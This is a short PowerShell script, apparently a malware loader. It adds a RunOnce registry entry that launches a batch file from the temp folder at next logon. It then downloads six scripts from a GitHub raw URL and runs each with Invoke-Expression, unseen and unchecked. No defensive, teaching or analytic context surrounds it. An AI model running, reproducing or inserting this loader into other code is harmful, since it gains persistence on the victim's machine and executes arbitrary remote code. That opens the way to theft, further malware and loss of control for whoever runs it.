reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v MyApp /t REG_SZ /d "$env:TEMP\run.bat" /f
for ($i = 1; $i -le 6; $i++) {
   
    $url = "https://raw.githubusercontent.com/chaoss3213/ccccxxc/refs/heads/main/dc$i.ps1"
    
    
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($url)
    
    
    Invoke-Expression $scriptContent
}